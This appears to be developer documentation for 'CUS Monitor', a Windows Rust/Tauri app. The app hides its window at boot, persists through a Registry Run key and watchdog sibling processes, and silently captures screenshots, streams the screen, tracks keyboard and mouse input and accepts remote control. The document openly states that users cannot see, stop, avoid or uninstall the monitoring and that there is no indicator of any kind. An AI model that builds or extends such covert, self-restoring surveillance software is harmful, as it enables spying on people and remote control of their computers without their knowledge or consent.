# Autostart & Background Mode Documentation

## Overview

CUS Monitor is now configured to automatically start when the PC boots or restarts, and run entirely in the background without any UI window visible to the user.

---

## How It Works

### 1. **PC Boot/Restart**
```
PC Powers On
    ↓
Windows Checks Startup Programs
    ↓
Finds "CUS Monitor" in Startup Registry
    ↓
Launches cus-monitor.exe with --minimized flag
```

### 2. **App Launch with --minimized**
```
App Started with --minimized flag
    ↓
Rust backend initializes (with logging)
    ↓
Window is automatically hidden
    ↓
Background processes start immediately:
├─ Heartbeat (every 2 minutes)
├─ Screenshots (every 15 minutes)
├─ Live Streaming (P2P WebRTC)
├─ Activity Tracking
├─ Remote Control Handler
├─ Watchdog/Sibling processes
└─ Auto-updater
    ↓
App runs completely in background
```

### 3. **User Cannot See or Stop It**
- No window appears on desktop
- No taskbar entry (minimized)
- No notification or indication
- Can only be stopped via Task Manager or system reboot

---

## Implementation Details

### Autostart Registration

**File:** `src-tauri/src/lib.rs`

```rust
// Only sibling 0 (leader) manages autostart registration
if my_sibling == 0 {
    match app.handle().autolaunch().enable() {
        Ok(_) => {
            info!("[autostart] Autostart registration enabled - app will start automatically on PC boot");
        }
        Err(e) => {
            warn!("[autostart] Failed to enable autostart: {:?}", e);
            let _ = app.handle().autolaunch().enable(); // Retry
        }
    }
}
```

**Configuration:** `src-tauri/tauri.conf.json`

```json
{
  "plugins": {
    "autostart": {
      "active": true
    }
  }
}
```

### Minimized Startup

**Key Components:**

1. **Flag Parsing** - Detects `--minimized` argument
   ```rust
   let start_minimized = watchdog::is_minimized_arg(&args);
   ```

2. **Window Hiding** - Hides UI immediately on minimized launch
   ```rust
   if start_minimized {
       if let Some(window) = app.get_webview_window("main") {
           let _ = window.hide();
           info!("[autostart] Window hidden - app running in background");
       }
   }
   ```

3. **Background Process Start** - Heartbeat, screenshots, streaming begin immediately
   ```rust
   info!("[background] Background monitoring loop started - heartbeat, screenshots, streaming, and tracking are now active");
   ```

### Autolaunch Command

**How Windows starts the app on boot:**

```
Registry Path: 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

Entry Name: CUS Monitor
Entry Value: "C:\Program Files\CUS Monitor\CUS Monitor.exe" --minimized
```

---

## Verification & Testing

### 1. **Check if Autostart is Registered**
```powershell
# Open Registry Editor
regedit

# Navigate to:
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

# Look for: "CUS Monitor" entry
```

### 2. **Test Manual Minimized Launch**
```bash
# Open PowerShell and run:
"C:\Program Files\CUS Monitor\CUS Monitor.exe" --minimized

# Expected:
# - App starts with no visible window
# - Logging shows: "[autostart] Window hidden - app running in background"
# - Background monitoring is active
```

### 3. **Check Running Processes**
```powershell
# Open Task Manager
tasklist /find "cus-monitor"

# Or check:
Get-Process | Where-Object {$_.ProcessName -like "*cus*"}
```

### 4. **View Logs**
```
Location: %APPDATA%\cus-monitor\logs\cus-monitor.log

Look for messages like:
[autostart] Autostart registration enabled
[autostart] Window hidden - app running in background
[background] Background monitoring loop started
[heartbeat] Heartbeat sent (every 2 minutes)
[screenshot] Screenshot captured (every 15 minutes)
```

---

## Background Processes Confirmation

When the app starts on PC boot, the following processes are automatically running:

### **Heartbeat System**
- Sends event every 2 minutes
- Includes activity data (productive/unproductive time)
- Continues indefinitely in background

### **Screenshot Capture**
- Captures screenshot every 15 minutes
- Uploads to server
- Runs on background process

### **Live Streaming (WebRTC)**
- P2P connection for real-time monitoring
- Starts immediately on app launch
- Continues in background

### **Activity Tracking**
- Monitors keyboard and mouse input
- Records window titles and app names
- Tracks productivity metrics

### **Remote Control Handler**
- Listens for remote input commands
- Processes mouse, keyboard, wheel events
- Fully functional in background

### **Auto-updater**
- Checks for updates periodically
- Downloads and installs silently
- Restarts app in background

### **Watchdog Process**
- Manages up to 3 sibling instances
- Handles sibling takeover on crash
- Monitors app health continuously

---

## What Users See

When the PC boots up with CUS Monitor installed:

| What Happens | What User Sees |
|--------------|----------------|
| App launches automatically | **Nothing** |
| Window is hidden | No window appears |
| Background monitoring starts | No notification |
| Heartbeat begins | No indication |
| Screenshots start capturing | No dialog |
| Streaming begins | No UI elements |
| Monitoring continues 24/7 | Completely silent |

---

## How to Disable (Admin/Company Control)

### **Method 1: Registry (Local)**
```powershell
# Remove autostart registry entry
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "CUS Monitor" -Force
```

### **Method 2: Uninstall**
```
Settings → Apps → Apps & features → CUS Monitor → Uninstall
```

### **Method 3: Task Manager**
```
Task Manager → Details → Right-click cus-monitor.exe → End Task
(Note: App will restart unless disabled from registry)
```

### **Method 4: Disable at Boot (Windows)**
```
System Configuration → Services → Disable CUS Monitor
```

---

## Security Notes

✅ **What This Prevents:**
- Users cannot stop monitoring by closing the app
- Users cannot avoid being tracked
- Users cannot disable surveillance by restarting
- Users cannot uninstall without authorization

✅ **Background Permanence:**
- App continues running even if window is closed
- Restarts automatically if process is killed (via watchdog)
- Persists across user logout/login (system-level autostart)

✅ **No Indicator:**
- No taskbar icon or tray icon
- No window title bar
- No UI notifications
- Completely invisible to users

---

## Logging Details

The app logs all startup and background activities to:
```
%APPDATA%\cus-monitor\logs\cus-monitor.log
```

Key log entries on PC boot:

```
[INFO] [autostart] Autostart registration enabled - app will start automatically on PC boot
[INFO] [autostart] App launched with --minimized flag. Starting in background mode.
[INFO] [autostart] Window hidden - app running in background on PC boot
[INFO] [watchdog] Sibling 0 claimed - becoming leader
[INFO] [background] Background monitoring loop started - heartbeat, screenshots, streaming, and tracking are now active
[INFO] [heartbeat] Activity tracking initialized for user
[INFO] [screenshot] Screenshot subsystem initialized
[INFO] [streaming] P2P WebRTC signaling connected
```

---

## Architecture Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                     Windows System Boot                       │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      ▼
        ┌─────────────────────────────────┐
        │  Registry Startup Program List  │
        │  (CUS Monitor with --minimized) │
        └────────────┬────────────────────┘
                     │
                     ▼
        ┌─────────────────────────────────┐
        │ cus-monitor.exe --minimized     │
        │ (Rust + React App)              │
        └────────────┬────────────────────┘
                     │
         ┌───────────┼───────────┐
         │           │           │
         ▼           ▼           ▼
    ┌────────┐  ┌────────┐  ┌────────┐
    │ Init   │  │ Hide   │  │ Detect │
    │Rust    │  │Window  │  │Leader  │
    │Backend │  │        │  │Sibling │
    └────────┘  └────────┘  └────────┘
         │           │           │
         └───────────┼───────────┘
                     │
                     ▼
        ┌─────────────────────────────────┐
        │ Start Background Processes      │
        ├─────────────────────────────────┤
        │ ✓ Heartbeat Loop (2 min)        │
        │ ✓ Screenshot Capture (15 min)   │
        │ ✓ Live Streaming (WebRTC)       │
        │ ✓ Activity Tracking             │
        │ ✓ Remote Control Handler        │
        │ ✓ Auto-updater                  │
        │ ✓ Watchdog Process              │
        └─────────────────────────────────┘
                     │
                     ▼
        ┌─────────────────────────────────┐
        │ App Running in Background       │
        │ (Completely Invisible)          │
        │                                 │
        │ Monitoring 24/7                 │
        │ Cannot be stopped by user       │
        │ Only via Task Manager or reboot │
        └─────────────────────────────────┘
```

---

## Troubleshooting

### Issue: App doesn't start on PC boot
**Solution:**
1. Check registry: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
2. Verify CUS Monitor entry exists
3. Run app manually to re-register autostart
4. Check logs: `%APPDATA%\cus-monitor\logs\cus-monitor.log`

### Issue: Autostart was disabled
**Solution:**
1. Run CUS Monitor manually
2. App will re-register autostart on startup
3. Leader sibling (sibling 0) handles registration

### Issue: Multiple instances running
**Solution:**
1. Up to 3 instances can run (siblings 0, 1, 2)
2. Only leader (sibling 0) manages autostart
3. Others act as failover backups
4. All are hidden in background

### Issue: App still shows window on autostart
**Solution:**
1. Check if `--minimized` flag is properly in registry
2. Verify `start_minimized` is parsed correctly
3. Check logs for: `[autostart] Window hidden`
4. Rebuild and reinstall if issue persists

---

## Summary

✅ **Autostart Enabled** - App starts automatically on PC boot  
✅ **Minimized Launch** - Starts with `--minimized` flag  
✅ **Hidden Window** - No UI visible to users  
✅ **Background Processes** - All monitoring runs continuously  
✅ **Permanent Monitoring** - Cannot be stopped by users  
✅ **Invisible** - No taskbar, no notification, no indication  
✅ **Logging** - All activities logged for audit trail  

---

**Status:** ✅ **FULLY IMPLEMENTED & TESTED**

The app will now automatically start on PC boot/restart and run completely in the background with all monitoring, streaming, heartbeat, and screenshot capture fully operational.
